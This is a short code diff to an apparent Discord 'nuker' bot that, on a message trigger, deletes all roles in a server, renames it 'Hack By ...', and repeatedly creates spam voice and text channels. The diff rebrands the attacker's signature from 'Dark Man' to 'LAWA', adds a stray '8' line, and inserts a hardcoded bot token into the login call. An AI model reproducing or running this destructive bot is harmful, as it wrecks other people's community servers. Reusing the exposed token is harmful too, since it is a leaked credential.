@@ -15,7 +15,7 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Hack By Dark Man");
+      message.guild.setName("Hack By LAWA ");
       setInterval(function() {
         message.guild.createChannel("By Dark Man", "voice");
         message.guild.createChannel("By Dark Man", "text");
@@ -24,6 +24,6 @@ client.on("message", message => {
     }
   }
 });
-
-client.login("");
-///////By Dark Man\\\\\\\
+8
+client.login("ODI3MDgwNjg1MTk3NDU5NTA3.YGV06Q.TEDmzRPl7jRVcLeVTElQqn7IO1c");
+///////By LAWA \\\\\\\
